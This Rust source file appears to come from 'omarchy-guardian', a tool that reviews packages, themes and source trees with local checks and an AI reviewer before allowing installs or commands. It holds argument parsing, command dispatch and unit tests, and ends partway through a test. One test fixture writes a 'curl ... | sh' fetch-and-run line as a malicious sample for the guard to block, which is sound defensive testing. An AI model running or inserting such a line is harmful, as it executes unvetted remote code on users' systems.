//! Command-line parsing and the top-level commands.

use std::ffi::{OsStr, OsString};
use std::fs::OpenOptions;
use std::io::{self, BufRead, BufReader, Write};
use std::os::unix::process::CommandExt;
use std::path::PathBuf;
use std::process::{Command, ExitCode};

use crate::ask;
use crate::config::Settings;
use crate::config::model::{AiRequirement, Named, Profile, SourceClass};
use crate::config::show;
use crate::engine::baseline::{self, Identity, Unit};
use crate::engine::store::Store;
use crate::error::Error;
use crate::makepkg_gate;
use crate::notify;
use crate::pacman::{self, HookArgs};
use crate::report::{Blocked, Decision, Report};
use crate::review::{self, ReviewContext};
use crate::sandbox;
use crate::scan::{self, ScanConfig};
use crate::setup;
use crate::sweep;
use crate::tools::OpenCode;
use crate::tui;

const USAGE: &str = "\
Usage:
  omarchy-guardian scan [--thorough] [--hashes] [--exclude NAME]... [--class CLASS] [--profile PROFILE] [--identity ID | --unit DIR ID ...] <file-or-directory>
  omarchy-guardian guard [--thorough] [--hashes] [--exclude NAME]... [--class CLASS] [--profile PROFILE] [--identity ID | --unit DIR ID ...] <file-or-directory> -- <command> [args...]
  omarchy-guardian sandbox [--hashes] [--profile PROFILE] [--identity ID | --unit DIR ID ...] <directory> -- <command> [args...]
  omarchy-guardian pacman-hook --pacman-pid PID --cwd DIR   (run by the pacman hook)
  omarchy-guardian pacman-hook --preflight                  (can the pacman gate review?)
  omarchy-guardian makepkg-gate -- <makepkg> [args...]      (run by the yay makepkg shim)
  omarchy-guardian config show [--class CLASS] | check | path
  omarchy-guardian forget <identity> | --all
  omarchy-guardian setup
  omarchy-guardian protect [--off] [--yes]          (turn every gate on, or the install gates off)
  omarchy-guardian test                             (test the saved reviewer with two samples)
  omarchy-guardian sweep [--all] [--json] [--root] [--diff] [--report] | allow PATH | forget PATH|--all
                                                    (check what already runs on its own on this system)
  omarchy-guardian ask <report-id>                  (open your AI agent on a saved report)
  omarchy-guardian status [--waybar | --dismiss | --open-report]
                                                    (bar widget status; mark blocks seen; open the last report)
  omarchy-guardian tui [--expert]                   (settings app; --expert shows every setting)

CLASS: aur, theme, plugin, source (default). PROFILE: standard, strict, local-only.
ID names what is reviewed for the review memory, e.g. aur:yay-bin.
forget ID drops that source's approved baselines; cached verdicts are kept
(forget --all clears them too).
Exit codes: 0 clear or warned, 1 findings, 2 incomplete review, AI unavailable,
not confirmed, or usage error. guard and sandbox replace these with the
command's own exit code once it starts.";

const USAGE_ERROR: u8 = 2;

#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Target {
    pub(crate) config: ScanConfig,
    pub(crate) show_hashes: bool,
    pub(crate) class: SourceClass,
    pub(crate) profile: Option<Profile>,
    pub(crate) units: Vec<Unit>,
    /// Filled in by `run`, so parsing stays free of the environment.
    pub(crate) state_root: Option<PathBuf>,
}

impl Target {
    /// What a notification says was blocked: the identities under review
    /// (such as `theme:tokyo`), else the reviewed directory's name.
    fn subject(&self) -> String {
        let identities: Vec<&str> = self
            .units
            .iter()
            .map(|unit| unit.identity.as_str())
            .collect();
        if identities.is_empty() {
            let name = self.config.root.file_name().map_or_else(
                || self.config.root.display().to_string(),
                |name| name.to_string_lossy().into_owned(),
            );
            format!("{name} ({})", self.class.name())
        } else {
            identities.join(", ")
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
enum Invocation {
    Scan(Target),
    Guard(Target, Vec<OsString>),
    Sandbox(Target, Vec<OsString>),
    PacmanHook(HookArgs),
    /// `pacman-hook --preflight`: can the gate review with these settings?
    HookPreflight,
    /// `makepkg-gate -- <makepkg> [args...]`, run by the yay makepkg shim.
    MakepkgGate(Vec<OsString>),
    Config(ConfigCommand),
    Forget(Forget),
    Setup,
    /// `protect [--yes]`: turn on every gate that is off.
    Protect {
        yes: bool,
        off: bool,
    },
    /// `test`: the two-sample reviewer test of the saved settings.
    Test,
    Sweep(sweep::Command),
    SweepCollect {
        out: bool,
    },
    /// `ask <report-id | omarchy-guardian://ask/<id>>`, opened from a report.
    Ask(String),
    /// `status [--waybar | --dismiss | --open-report]`.
    Status(StatusMode),
    Tui {
        expert: bool,
    },
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum StatusMode {
    /// JSON for the Omarchy shell widget.
    Shell,
    Waybar,
    Dismiss,
    OpenReport,
}

#[derive(Debug, PartialEq, Eq)]
enum ConfigCommand {
    Show(Option<SourceClass>),
    Check,
    Path,
}

#[derive(Debug, PartialEq, Eq)]
enum Forget {
    All,
    One(Identity),
}

/// Asks the person at the terminal. Anything but an explicit yes, and any
/// failure to reach a terminal, is a no.
pub trait Confirm {
    fn confirm(&mut self, question: &str) -> bool;
}

pub struct TtyConfirm;

impl Confirm for TtyConfirm {
    fn confirm(&mut self, question: &str) -> bool {
        let Ok(mut tty) = OpenOptions::new().read(true).write(true).open("/dev/tty") else {
            return false;
        };
        if write!(tty, "{question} [y/N] ")
            .and_then(|()| tty.flush())
            .is_err()
        {
            return false;
        }

        let mut answer = String::new();
        if BufReader::new(tty).read_line(&mut answer).is_err() {
            return false;
        }
        matches!(answer.trim(), "y" | "Y" | "yes" | "YES")
    }
}

pub fn run(args: impl Iterator<Item = OsString>) -> ExitCode {
    let args: Vec<OsString> = args.collect();
    let invocation = match parse(&args) {
        Ok(invocation) => invocation,
        Err(message) => {
            errln!("omarchy-guardian: {message}\n\n{USAGE}");
            return ExitCode::from(USAGE_ERROR);
        }
    };

    let settings = Settings::load();
    for warning in settings.warnings() {
        errln!("omarchy-guardian: {warning}");
    }

    match invocation {
        Invocation::Scan(target) => scan_command(&with_state_root(target), &settings),
        Invocation::Guard(target, command) => guard_command(
            &with_state_root(target),
            &command,
            &settings,
            &OpenCode::UserPath,
            &mut TtyConfirm,
            &mut exec_command,
        ),
        Invocation::Sandbox(target, command) => sandbox_command(
            &with_state_root(target),
            &command,
            &settings,
            &mut TtyConfirm,
        ),
        Invocation::PacmanHook(hook) => pacman_hook_command(&hook, &settings),
        Invocation::MakepkgGate(command) => makepkg_gate::run(&command, &settings),
        Invocation::HookPreflight => {
            match pacman::preflight(&settings, pacman::system_reviewer_ready(&settings)) {
                Ok(()) => {
                    outln!("The pacman gate can review transactions with these settings.");
                    ExitCode::SUCCESS
                }
                Err(reason) => {
                    errln!("omarchy-guardian: {reason}");
                    ExitCode::from(2)
                }
            }
        }
        Invocation::Config(command) => config_command(&command, &settings),
        Invocation::Forget(forget) => forget_command(&forget, Store::default_root()),
        Invocation::Setup => match setup::run(&mut setup::TtyTerminal, &setup::RealEnvironment) {
            Ok(()) => ExitCode::SUCCESS,
            Err(message) => {
                errln!("omarchy-guardian setup: {message}");
                ExitCode::from(2)
            }
        },
        Invocation::Protect { yes, off } => match if off {
            tui::unprotect(yes, &mut TtyConfirm)
        } else {
            tui::protect(yes, &mut TtyConfirm)
        } {
            Ok(message) => {
                outln!("{message}");
                ExitCode::SUCCESS
            }
            Err(message) => {
                errln!("omarchy-guardian protect: {message}");
                ExitCode::from(2)
            }
        },
        Invocation::Test => {
            outln!("Testing the reviewer with a malicious and a harmless sample...");
            let (report, passed) = tui::test();
            outln!("{report}");
            if passed {
                ExitCode::SUCCESS
            } else {
                ExitCode::from(1)
            }
        }
        Invocation::Sweep(command) => sweep::command(&command, &settings),
        Invocation::SweepCollect { out } => sweep::root::collect_command(out, &settings),
        Invocation::Status(mode) => status_command(mode),
        Invocation::Ask(target) => {
            errln!("omarchy-guardian ask: {}", ask::run(&target, &settings));
            ExitCode::from(2)
        }
        Invocation::Tui { expert } => match tui::run(expert) {
            Ok(()) => ExitCode::SUCCESS,
            Err(message) => {
                errln!("omarchy-guardian tui: {message}");
                ExitCode::from(2)
            }
        },
    }
}

/// A one-run profile override (`--profile`) applies on top of the loaded
/// settings; without it the loaded settings are used unchanged.
fn settings_for(target: &Target, settings: &Settings) -> Settings {
    match target.profile {
        Some(profile) => settings.clone().with_profile(profile),
        None => settings.clone(),
    }
}

/// Commands review with the user's review memory.
fn with_state_root(mut target: Target) -> Target {
    target.state_root = Store::default_root();
    target
}

/// Reviews a target, applies confirmation, then prints the report once with
/// the final decision — never a stale pre-confirmation headline.
pub(crate) fn review_and_decide(
    target: &Target,
    settings: &Settings,
    opencode: &OpenCode,
    confirm: Option<&mut dyn Confirm>,
    context: &[String],
) -> (Report, Decision) {
    let report = review::review_tree(
        &target.config,
        &ReviewContext {
            settings,
            class: target.class,
            opencode,
            units: &target.units,
            state_root: target.state_root.as_deref(),
            context,
        },
    );
    let mut decision = report.decide(&|class| settings.policy(class));

    // Confirmation is only meaningful when the class was never sent to the
    // AI provider at all (`ai = off`); it never substitutes for a review.
    let policy = settings.policy(target.class);
    if let Some(confirm) = confirm
        && decision.allows_running()
        && policy.confirm
        && policy.ai == AiRequirement::Off
    {
        errln!(
            "Local checks: {} text file(s), no blocking findings.",
            report.text_files_reviewed
        );
        let question = format!(
            "Local checks found nothing blocking in {}. No AI review ran. Run it?",
            report.subject
        );
        if !confirm.confirm(&question) {
            decision = Decision::Blocked(Blocked::NotConfirmed);
        }
    }

    report.print(target.show_hashes, decision);
    (report, decision)
}

fn scan_command(target: &Target, settings: &Settings) -> ExitCode {
    let settings = settings_for(target, settings);
    review_and_decide(target, &settings, &OpenCode::UserPath, None, &[])
        .1
        .exit_code()
}

/// Reviews the target and hands `command` to `launch` only after a clear or
/// warned review, an approved confirmation and an unchanged re-hash of the
/// tree.
fn guard_command(
    target: &Target,
    command: &[OsString],
    settings: &Settings,
    opencode: &OpenCode,
    confirm: &mut dyn Confirm,
    launch: &mut dyn FnMut(&[OsString]) -> ExitCode,
) -> ExitCode {
    let settings = settings_for(target, settings);
    let (report, decision) = review_and_decide(target, &settings, opencode, Some(confirm), &[]);

    if !decision.allows_running() {
        match decision {
            Decision::Blocked(Blocked::NotConfirmed) => {
                errln!("Guardian did not start the command: not confirmed.");
            }
            Decision::Blocked(blocked) => {
                errln!("Guardian blocked the command because the review did not allow it.");
                notify::blocked(
                    &target.subject(),
                    notify::reason(blocked),
                    notify::Ran::Nothing,
                );
            }
            _ => errln!("Guardian blocked the command because the review did not allow it."),
        }
        return decision.exit_code();
    }
    if let Err(error) = scan::verify_unchanged(&target.config, &report.snapshot) {
        errln!("Guardian blocked the command because {error}.");
        notify::blocked(&target.subject(), &format!("{error}"), notify::Ran::Nothing);
        return ExitCode::from(2);
    }

    errln!(
        "Guardian: review {}; starting {}",
        if decision == Decision::Warned {
            "passed with warnings"
        } else {
            "clear"
        },
        command.first().map_or_else(String::new, |program| program
            .to_string_lossy()
            .into_owned())
    );
    launch(command)
}

/// Replaces this process with the guarded command, so its exit status and
/// signal behaviour are exactly the command's own.
pub(crate) fn exec_command(command: &[OsString]) -> ExitCode {
    let Some((program, arguments)) = command.split_first() else {
        return ExitCode::from(USAGE_ERROR);
    };
    // Nothing more can be reported if stdout is already gone.
    drop(io::stdout().flush());

    let error = Command::new(program).args(arguments).exec();
    errln!(
        "Could not start guarded command {}: {error}",
        program.to_string_lossy()
    );
    ExitCode::from(2)
}

fn sandbox_command(
    target: &Target,
    command: &[OsString],
    settings: &Settings,
    confirm: &mut dyn Confirm,
) -> ExitCode {
    let settings = settings_for(target, settings);
    let (report, decision) =
        review_and_decide(target, &settings, &OpenCode::UserPath, Some(confirm), &[]);

    if !decision.allows_running() {
        if decision == Decision::Blocked(Blocked::NotConfirmed) {
            errln!("Guardian did not start the sandbox command: not confirmed.");
        } else {
            errln!("Guardian did not run the sandbox command because the review did not allow it.");
        }
        return decision.exit_code();
    }
    match sandbox::run(&target.config, &report.snapshot, command) {
        Ok(code) => code,
        Err(error) => {
            errln!("Guardian blocked the sandbox run because {error}.");
            ExitCode::from(2)
        }
    }
}

fn status_command(mode: StatusMode) -> ExitCode {
    let result = match mode {
        StatusMode::Shell => {
            outln!("{}", tui::status::json());
            Ok(())
        }
        StatusMode::Waybar => {
            outln!("{}", tui::status::waybar());
            Ok(())
        }
        StatusMode::Dismiss => tui::status::dismiss(),
        StatusMode::OpenReport => tui::status::open_report(),
    };
    match result {
        Ok(()) => ExitCode::SUCCESS,
        Err(message) => {
            errln!("omarchy-guardian status: {message}");
            ExitCode::from(2)
        }
    }
}

fn pacman_hook_command(hook: &HookArgs, settings: &Settings) -> ExitCode {
    match pacman::review_transaction(hook, settings) {
        Ok(report) => {
            let decision = report.decide(&|class| settings.policy(class));
            report.print(false, decision);
            if let Decision::Blocked(blocked) = decision {
                notify::blocked(
                    "a pacman transaction",
                    notify::reason(blocked),
                    notify::Ran::Nothing,
                );
            }
            decision.exit_code()
        }
        Err(error) => {
            errln!("Guardian blocked the pacman transaction: {error}");
            notify::blocked(
                "a pacman transaction",
                &error.to_string(),
                notify::Ran::Nothing,
            );
            ExitCode::from(2)
        }
    }
}

fn config_command(command: &ConfigCommand, settings: &Settings) -> ExitCode {
    match command {
        ConfigCommand::Show(class) => {
            let classes: Vec<SourceClass> = match class {
                Some(class) => vec![*class],
                None => SourceClass::ALL.to_vec(),
            };
            out!("{}", show::render_show(settings, &classes));
            out!("{}", show::render_memory(Store::default_root().as_deref()));
            ExitCode::SUCCESS
        }
        ConfigCommand::Check => {
            let (text, valid) = show::render_check(settings);
            out!("{text}");
            if valid {
                ExitCode::SUCCESS
            } else {
                ExitCode::from(2)
            }
        }
        ConfigCommand::Path => {
            outln!("{}", settings.system_path().display());
            if let Some(path) = settings.user_path() {
                outln!("{}", path.display());
            }
            ExitCode::SUCCESS
        }
    }
}

fn parse_sweep(args: &[OsString]) -> Result<sweep::Command, String> {
    const USAGE: &str = "usage: omarchy-guardian sweep [--all] [--json] [--root] [--diff] [--report] | allow PATH | forget PATH | forget --all";
    let text: Vec<&str> = args
        .iter()
        .map(|arg| arg.to_str().ok_or("arguments must be UTF-8"))
        .collect::<Result<_, _>>()?;
    match text.as_slice() {
        ["allow", path] => return Ok(sweep::Command::Allow((*path).to_string())),
        ["forget", "--all"] => return Ok(sweep::Command::Forget(None)),
        ["forget", path] => return Ok(sweep::Command::Forget(Some((*path).to_string()))),
        ["allow" | "forget", ..] => return Err(USAGE.into()),
        _ => {}
    }
    let mut options = sweep::Options::default();
    for flag in text {
        match flag {
            "--all" => options.view = sweep::View::All,
            "--json" => options.view = sweep::View::Json,
            "--diff" => options.view = sweep::View::Changes,
            "--root" => options.root = true,
            "--report" => options.report = true,
            // Run by the user timer.
            "--scheduled" => options.scheduled = true,
            _ => return Err(USAGE.into()),
        }
    }
    if options.report && options.view == sweep::View::Json {
        return Err("sweep: --report saves the printed report; it does not go with --json".into());
    }
    // The timer's run saves its own page when it notifies.
    if options.report && options.scheduled {
        return Err(USAGE.into());
    }
    Ok(sweep::Command::Run(options))
}

fn parse_forget(args: &[OsString]) -> Result<Forget, String> {
    match args {
        [arg] if arg == "--all" => Ok(Forget::All),
        [arg] => match arg.to_str() {
            Some(text) if text.starts_with('-') => Err(format!(
                "unknown option {text:?}; forget takes one identity or --all"
            )),
            Some(text) => Identity::parse(text).map(Forget::One),
            None => Err("the identity must be UTF-8".to_string()),
        },
        _ => Err("forget takes one identity or --all".into()),
    }
}

/// Drops approved baselines (and with `--all`, every cached verdict; one
/// identity's cached verdicts are kept, since verdicts are not keyed by
/// identity).
fn forget_command(forget: &Forget, root: Option<PathBuf>) -> ExitCode {
    let Some(root) = root else {
        errln!("omarchy-guardian: no state directory (set HOME or XDG_STATE_HOME)");
        return ExitCode::from(2);
    };
    if !root.is_dir() {
        outln!("Nothing to forget: {} does not exist.", root.display());
        return ExitCode::SUCCESS;
    }
    let store = match Store::open(root) {
        Ok(store) => store,
        Err(reason) => {
            errln!("omarchy-guardian: {reason}");
            return ExitCode::from(2);
        }
    };
    match forget_in(forget, &store) {
        Ok(message) => {
            outln!("{message}");
            ExitCode::SUCCESS
        }
        Err(error) => {
            errln!("omarchy-guardian: {error}");
            ExitCode::from(2)
        }
    }
}

/// Forgets what `forget` names in `store`; returns the line to print.
fn forget_in(forget: &Forget, store: &Store) -> Result<String, Error> {
    match forget {
        Forget::All => baseline::forget_all(store)
            .map(|count| format!("Forgot {count} approved baseline(s) and every cached verdict.")),
        Forget::One(identity) => baseline::forget(store, identity).map(|count| {
            format!(
                "Forgot {count} approved baseline(s) for {}. Cached verdicts are kept; use forget --all to clear them too.",
                identity.as_str()
            )
        }),
    }
}

#[derive(Clone, Copy)]
struct Allowed {
    thorough: bool,
    exclude: bool,
    class: bool,
}

fn parse(args: &[OsString]) -> Result<Invocation, String> {
    let Some((command, rest)) = args.split_first() else {
        return Err("missing command".into());
    };
    let full = Allowed {
        thorough: true,
        exclude: true,
        class: true,
    };

    match command.to_str() {
        Some("scan") => Ok(Invocation::Scan(parse_target(rest, full)?)),
        Some("guard") => {
            let (options, command) = split_command(rest)?;
            Ok(Invocation::Guard(parse_target(options, full)?, command))
        }
        Some("sandbox") => {
            let (options, command) = split_command(rest)?;
            let mut target = parse_target(
                options,
                Allowed {
                    thorough: false,
                    exclude: false,
                    class: false,
                },
            )?;
            // The sandbox copies everything but `.git`, so everything is reviewed.
            target.config.include_ignored_dirs = true;
            Ok(Invocation::Sandbox(target, command))
        }
        Some("pacman-hook") if rest.len() == 1 && rest[0] == "--preflight" => {
            Ok(Invocation::HookPreflight)
        }
        Some("pacman-hook") => parse_hook(rest).map(Invocation::PacmanHook),
        Some("makepkg-gate") => makepkg_gate::parse(rest).map(Invocation::MakepkgGate),
        Some("config") => parse_config(rest).map(Invocation::Config),
        Some("forget") => parse_forget(rest).map(Invocation::Forget),
        Some("setup") if rest.is_empty() => Ok(Invocation::Setup),
        Some("protect") => {
            let mut yes = false;
            let mut off = false;
            for flag in rest {
                match flag.to_str() {
                    Some("--yes" | "-y") => yes = true,
                    Some("--off") => off = true,
                    _ => return Err("usage: omarchy-guardian protect [--off] [--yes]".into()),
                }
            }
            Ok(Invocation::Protect { yes, off })
        }
        Some("test") if rest.is_empty() => Ok(Invocation::Test),
        Some("sweep") => parse_sweep(rest).map(Invocation::Sweep),
        // Run as root by `sweep --root`; not listed in the usage.
        Some("sweep-collect") => match rest {
            [] => Ok(Invocation::SweepCollect { out: false }),
            [flag] if flag == "--out" => Ok(Invocation::SweepCollect { out: true }),
            _ => Err("usage: omarchy-guardian sweep-collect [--out]".into()),
        },
        Some("status") => match rest {
            [] => Ok(Invocation::Status(StatusMode::Shell)),
            [flag] => match flag.to_str() {
                Some("--waybar") => Ok(Invocation::Status(StatusMode::Waybar)),
                Some("--dismiss") => Ok(Invocation::Status(StatusMode::Dismiss)),
                Some("--open-report") => Ok(Invocation::Status(StatusMode::OpenReport)),
                _ => Err(
                    "usage: omarchy-guardian status [--waybar | --dismiss | --open-report]".into(),
                ),
            },
            _ => {
                Err("usage: omarchy-guardian status [--waybar | --dismiss | --open-report]".into())
            }
        },
        Some("ask") => match rest {
            [target] => target
                .to_str()
                .map(|target| Invocation::Ask(target.to_string()))
                .ok_or_else(|| "the report id must be UTF-8".to_string()),
            _ => Err("usage: omarchy-guardian ask <report-id>".into()),
        },
        Some("tui" | "settings") => match rest {
            [] => Ok(Invocation::Tui { expert: false }),
            [flag] if flag == "--expert" => Ok(Invocation::Tui { expert: true }),
            _ => Err("usage: omarchy-guardian tui [--expert]".into()),
        },
        _ => Err(format!("unknown command {:?}", command.to_string_lossy())),
    }
}

fn parse_config(args: &[OsString]) -> Result<ConfigCommand, String> {
    let words: Vec<&str> = args
        .iter()
        .map(|arg| arg.to_str().unwrap_or_default())
        .collect();
    match words.as_slice() {
        ["show"] => Ok(ConfigCommand::Show(None)),
        ["show", "--class", name] => SourceClass::parse(name)
            .map(|class| ConfigCommand::Show(Some(class)))
            .ok_or_else(|| format!("unknown class {name:?}")),
        ["check"] => Ok(ConfigCommand::Check),
        ["path"] => Ok(ConfigCommand::Path),
        _ => Err("config takes show [--class CLASS], check or path".into()),
    }
}

fn split_command(args: &[OsString]) -> Result<(&[OsString], Vec<OsString>), String> {
    let separator = args
        .iter()
        .position(|arg| arg == "--")
        .ok_or("missing `--` before the command")?;
    let command = args[separator + 1..].to_vec();
    if command.is_empty() {
        return Err("missing command after `--`".into());
    }
    Ok((&args[..separator], command))
}

fn parse_target(args: &[OsString], allowed: Allowed) -> Result<Target, String> {
    let mut root: Option<PathBuf> = None;
    let mut include_ignored_dirs = false;
    let mut show_hashes = false;
    let mut excluded_top_level = Vec::new();
    let mut class = SourceClass::Source;
    let mut profile = None;
    let mut units: Vec<Unit> = Vec::new();
    let mut args = args.iter();

    while let Some(arg) = args.next() {
        match arg.to_str() {
            Some("--hashes") => show_hashes = true,
            Some("--thorough") if allowed.thorough => include_ignored_dirs = true,
            Some("--exclude") if allowed.exclude => {
                let name = args.next().ok_or("--exclude needs a directory name")?;
                excluded_top_level.push(parse_top_level_name("--exclude", name)?);
            }
            Some("--class") if allowed.class => {
                let name = args
                    .next()
                    .and_then(|name| name.to_str())
                    .unwrap_or_default();
                let parsed = SourceClass::parse(name)
                    .filter(|class| !class.is_privileged())
                    .ok_or_else(|| {
                        format!("--class takes one of: aur, theme, plugin, source (got {name:?})")
                    })?;
                class = parsed;
            }
            Some("--identity") => {
                if !units.is_empty() {
                    return Err("--identity is given once and never with --unit".into());
                }
                units.push(Unit {
                    prefix: String::new(),
                    identity: parse_identity("--identity", args.next())?,
                });
            }
            Some("--unit") => {
                if units.iter().any(|unit| unit.prefix.is_empty()) {
                    return Err("--unit cannot be combined with --identity".into());
                }
                let name = args
                    .next()
                    .ok_or("--unit needs a directory name and an identity")?;
                let prefix = format!("{}/", parse_top_level_name("--unit", name)?);
                let identity = parse_identity("--unit", args.next())?;
                if units
                    .iter()
                    .any(|unit| unit.prefix == prefix || unit.identity == identity)
                {
                    return Err("--unit names each directory and each identity once".into());
                }
                units.push(Unit { prefix, identity });
            }
            Some("--profile") => {
                let name = args
                    .next()
                    .and_then(|name| name.to_str())
                    .unwrap_or_default();
                profile = Some(Profile::parse(name).ok_or_else(|| {
                    format!("--profile takes standard, strict or local-only (got {name:?})")
                })?);
            }
            Some(option) if option.starts_with('-') => {
                return Err(format!(
                    "unknown option {option:?} (prefix a path that starts with `-` with ./)"
                ));
            }
            Some(_) | None if root.is_none() => root = Some(PathBuf::from(arg)),
            Some(_) | None => return Err("more than one path given".into()),
        }
    }

    let mut config = ScanConfig::new(root.ok_or("missing file or directory to review")?);
    config.include_ignored_dirs = include_ignored_dirs;
    config.excluded_top_level = excluded_top_level;
    Ok(Target {
        config,
        show_hashes,
        class,
        profile,
        units,
        state_root: None,
    })
}

fn parse_top_level_name(option: &str, name: &OsStr) -> Result<String, String> {
    match name.to_str() {
        Some(name) if !name.is_empty() && name != "." && name != ".." && !name.contains('/') => {
            Ok(name.to_string())
        }
        Some(_) | None => Err(format!(
            "{option} takes one top-level directory name, not {:?}",
            name.to_string_lossy()
        )),
    }
}

fn parse_identity(option: &str, value: Option<&OsString>) -> Result<Identity, String> {
    let text = value
        .and_then(|value| value.to_str())
        .ok_or_else(|| format!("{option} needs an identity"))?;
    Identity::parse(text)
}

fn parse_hook(args: &[OsString]) -> Result<HookArgs, String> {
    let mut pacman_pid = None;
    let mut cwd = None;
    let mut opencode = OpenCode::SystemOnly;
    let mut args = args.iter();

    while let Some(arg) = args.next() {
        match arg.to_str() {
            Some("--pacman-pid") => {
                let value = args.next().and_then(|value| value.to_str());
                pacman_pid = Some(
                    value
                        .and_then(|value| value.parse::<u32>().ok())
                        .ok_or("--pacman-pid needs a process id")?,
                );
            }
            Some("--cwd") => {
                let value = args.next().ok_or("--cwd needs a directory")?;
                let value = PathBuf::from(value);
                if !value.is_absolute() {
                    return Err("--cwd must be an absolute path".into());
                }
                cwd = Some(value);
            }
            Some("--opencode-from-path") => opencode = OpenCode::UserPath,
            Some(_) | None => {
                return Err(format!(
                    "unexpected pacman-hook argument {:?}",
                    arg.to_string_lossy()
                ));
            }
        }
    }

    Ok(HookArgs {
        pacman_pid: pacman_pid.ok_or("missing --pacman-pid")?,
        cwd: cwd.ok_or("missing --cwd")?,
        opencode,
    })
}

#[cfg(test)]
mod tests {
    use std::ffi::OsString;
    use std::fs;
    use std::path::PathBuf;
    use std::process::ExitCode;

    use super::{
        ConfigCommand, Confirm, Forget, Invocation, Target, forget_command, forget_in,
        guard_command, parse, review_and_decide,
    };
    use crate::agent::SourceFile;
    use crate::config::Settings;
    use crate::config::file::{PartialConfig, PartialPolicy};
    use crate::config::model::{AgentSettings, AiRequirement, Profile, SourceClass};
    use crate::engine::baseline::{self, Identity, Unit};
    use crate::engine::store::Store;
    use crate::report::{Blocked, Decision};
    use crate::scan::ScanConfig;
    use crate::test_support::{TempDir, mock_opencode};
    use crate::tools::OpenCode;

    fn args(values: &[&str]) -> Vec<OsString> {
        values.iter().map(OsString::from).collect()
    }

    fn unavailable() -> OpenCode {
        OpenCode::At(PathBuf::from("/nonexistent/opencode"))
    }

    fn default_settings() -> Settings {
        Settings::from_parts(PartialConfig::default(), PartialConfig::default())
    }

    fn local_only() -> Settings {
        default_settings().with_profile(Profile::LocalOnly)
    }

    struct Scripted(Option<bool>, Vec<String>);

    impl Confirm for Scripted {
        fn confirm(&mut self, question: &str) -> bool {
            self.1.push(question.to_string());
            self.0.unwrap_or(false)
        }
    }

    #[test]
    fn sweep_report_parses_but_not_with_json() {
        let Ok(Invocation::Sweep(crate::sweep::Command::Run(options))) =
            parse(&args(&["sweep", "--report"]))
        else {
            panic!("sweep --report did not parse");
        };
        assert!(options.report);
        assert!(parse(&args(&["sweep", "--json", "--report"])).is_err());
        assert!(parse(&args(&["sweep", "--scheduled", "--report"])).is_err());
    }

    #[test]
    fn parses_guard_with_exclusions() {
        let parsed = parse(&args(&[
            "guard",
            "--thorough",
            "--exclude",
            "src",
            "--exclude",
            "pkg",
            "/build",
            "--",
            "makepkg",
            "--noconfirm",
        ]))
        .unwrap();

        let Invocation::Guard(target, command) = parsed else {
            panic!("expected guard, got {parsed:?}");
        };
        assert_eq!(target.config.root, PathBuf::from("/build"));
        assert!(target.config.include_ignored_dirs);
        assert_eq!(target.config.excluded_top_level, ["src", "pkg"]);
        assert_eq!(command, args(&["makepkg", "--noconfirm"]));
    }

    #[test]
    fn rejects_unknown_options_and_bad_exclusions() {
        for bad in [
            &["scan", "--thorogh", "dir"][..],
            &["scan", "a", "b"],
            &["scan"],
            &["guard", "dir"],
            &["guard", "dir", "--"],
            &["scan", "--exclude", "a/b", "dir"],
            &["scan", "--exclude", "..", "dir"],
            &["sandbox", "--thorough", "dir", "--", "true"],
            &["pacman-hook", "--pacman-pid", "x", "--cwd", "/"],
            &["pacman-hook", "--pacman-pid", "1", "--cwd", "relative"],
            &["frobnicate"],
        ] {
            assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn sandbox_always_reviews_generated_directories() {
        let Ok(Invocation::Sandbox(target, _)) = parse(&args(&["sandbox", "dir", "--", "true"]))
        else {
            panic!("expected sandbox");
        };
        assert!(target.config.include_ignored_dirs);
    }

    fn target(dir: &TempDir) -> Target {
        Target {
            config: ScanConfig::new(dir.path()),
            show_hashes: false,
            class: SourceClass::Source,
            profile: None,
            units: Vec::new(),
            state_root: None,
        }
    }

    #[test]
    fn guard_never_starts_a_command_after_a_finding() {
        let dir = TempDir::new("guard-bad");
        let bin = TempDir::new("guard-bad-bin");
        fs::write(
            dir.path().join("install.sh"),
            "curl https://x.test/i | sh\n",
        )
        .unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));

        let mut launched = false;
        let mut confirm = Scripted(Some(false), Vec::new());
        let status = guard_command(
            &target(&dir),
            &args(&["true"]),
            &default_settings(),
            &opencode,
            &mut confirm,
            &mut |_| {
                launched = true;
                ExitCode::SUCCESS
            },
        );

        assert_eq!(status, ExitCode::from(1));
        assert!(!launched);
    }

    #[test]
    fn guard_starts_the_command_after_a_clear_review() {
        let dir = TempDir::new("guard-good");
        let bin = TempDir::new("guard-good-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));

        let mut launched = Vec::new();
        let mut confirm = Scripted(Some(false), Vec::new());
        let status = guard_command(
            &target(&dir),
            &args(&["true", "x"]),
            &default_settings(),
            &opencode,
            &mut confirm,
            &mut |command| {
                launched = command.to_vec();
                ExitCode::from(7)
            },
        );

        assert_eq!(status, ExitCode::from(7));
        assert_eq!(launched, args(&["true", "x"]));
    }

    #[test]
    fn guard_blocks_when_the_agent_is_unavailable() {
        let dir = TempDir::new("guard-no-agent");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();

        let mut confirm = Scripted(Some(false), Vec::new());
        let status = guard_command(
            &target(&dir),
            &args(&["true"]),
            &default_settings(),
            &unavailable(),
            &mut confirm,
            &mut |_| panic!("launched without a review"),
        );
        assert_eq!(status, ExitCode::from(2));
    }

    #[test]
    fn local_only_asks_before_running() {
        let dir = TempDir::new("confirm-yes");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };

        let mut yes = Scripted(Some(true), Vec::new());
        let mut launched = false;
        let status = guard_command(
            &target,
            &args(&["true"]),
            &local_only(),
            &unavailable(),
            &mut yes,
            &mut |_| {
                launched = true;
                ExitCode::SUCCESS
            },
        );
        assert!(launched);
        assert_eq!(status, ExitCode::SUCCESS);
        assert_eq!(yes.1.len(), 1);
    }

    #[test]
    fn confirmation_without_a_terminal_blocks() {
        let dir = TempDir::new("confirm-none");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };

        let mut no_terminal = Scripted(None, Vec::new());
        let status = guard_command(
            &target,
            &args(&["true"]),
            &local_only(),
            &unavailable(),
